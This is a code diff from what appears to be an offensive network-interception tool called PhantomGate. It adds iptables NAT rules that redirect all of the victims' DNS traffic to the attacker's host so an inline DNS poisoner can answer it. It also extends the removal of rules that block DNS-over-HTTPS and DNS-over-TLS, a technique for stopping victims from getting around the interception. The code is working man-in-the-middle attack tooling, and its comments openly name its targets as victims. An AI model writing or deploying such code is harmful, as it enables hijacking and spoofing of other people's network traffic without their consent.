@@ -100,19 +100,72 @@ func UnblockDoH() {
 	for _, ip := range dohProviderIPs {
 		if strings.Contains(ip, ":") {
 			run("ip6tables", "-D", "FORWARD", "-d", ip, "-p", "tcp", "--dport", "443", "-j", "DROP")
+			run("ip6tables", "-D", "OUTPUT", "-d", ip, "-p", "tcp", "--dport", "443", "-j", "DROP")
 		} else {
 			run("iptables", "-D", "FORWARD", "-d", ip, "-p", "tcp", "--dport", "443", "-j", "DROP")
+			run("iptables", "-D", "OUTPUT", "-d", ip, "-p", "tcp", "--dport", "443", "-j", "DROP")
 		}
 	}
 
 	run("iptables", "-D", "FORWARD", "-p", "udp", "--dport", "443", "-j", "DROP")
+	run("iptables", "-D", "OUTPUT", "-p", "udp", "--dport", "443", "-j", "DROP")
 	run("ip6tables", "-D", "FORWARD", "-p", "udp", "--dport", "443", "-j", "DROP")
 
 	run("iptables", "-D", "FORWARD", "-p", "tcp", "--dport", "853", "-j", "DROP")
 	run("iptables", "-D", "FORWARD", "-p", "udp", "--dport", "853", "-j", "DROP")
+	run("iptables", "-D", "OUTPUT", "-p", "tcp", "--dport", "853", "-j", "DROP")
 	run("ip6tables", "-D", "FORWARD", "-p", "tcp", "--dport", "853", "-j", "DROP")
 
 	log.Println("[DoH BYPASS] DoH blocking rules removed")
+}
+
+// redirectDNS adds NAT rules to intercept ALL DNS traffic (port 53) from victims,
+// regardless of which DNS server they're configured to use (8.8.8.8, 1.1.1.1, etc.).
+// Traffic is redirected to our machine where the inline DNS poisoner catches it.
+func redirectDNS(localIP string) error {
+	log.Printf("[DNS REDIRECT] Intercepting all DNS traffic (port 53) → %s", localIP)
+
+	// Exclude our OWN outgoing DNS from DNAT to prevent loops.
+	// Without this, our forwardDNS() queries to 8.8.8.8:53 get DNAT'd back to ourselves.
+	run("iptables", "-t", "nat", "-I", "OUTPUT",
+		"-p", "udp", "--dport", "53", "-m", "owner", "--uid-owner", "0",
+		"-j", "ACCEPT")
+
+	// Redirect forwarded UDP DNS (victim → any DNS server) to us
+	if err := run("iptables", "-t", "nat", "-I", "PREROUTING",
+		"!", "-s", localIP,
+		"-p", "udp", "--dport", "53",
+		"-j", "DNAT", "--to-destination", localIP+":53"); err != nil {
+		return err
+	}
+
+	// Redirect forwarded TCP DNS to us
+	run("iptables", "-t", "nat", "-I", "PREROUTING",
+		"!", "-s", localIP,
+		"-p", "tcp", "--dport", "53",
+		"-j", "DNAT", "--to-destination", localIP+":53")
+
+	log.Printf("[DNS REDIRECT] All victim DNS now routed through PhantomGate")
+	return nil
+}
+
+// unredirectDNS removes the DNS NAT redirect rules
+func unredirectDNS(localIP string) {
+	log.Println("[DNS REDIRECT] Removing DNS redirect rules...")
+
+	run("iptables", "-t", "nat", "-D", "OUTPUT",
+		"-p", "udp", "--dport", "53", "-m", "owner", "--uid-owner", "0",
+		"-j", "ACCEPT")
+	run("iptables", "-t", "nat", "-D", "PREROUTING",
+		"!", "-s", localIP,
+		"-p", "udp", "--dport", "53",
+		"-j", "DNAT", "--to-destination", localIP+":53")
+	run("iptables", "-t", "nat", "-D", "PREROUTING",
+		"!", "-s", localIP,
+		"-p", "tcp", "--dport", "53",
+		"-j", "DNAT", "--to-destination", localIP+":53")
+
+	log.Println("[DNS REDIRECT] DNS redirect rules removed")
 }
 
 func run(name string, args ...string) error {
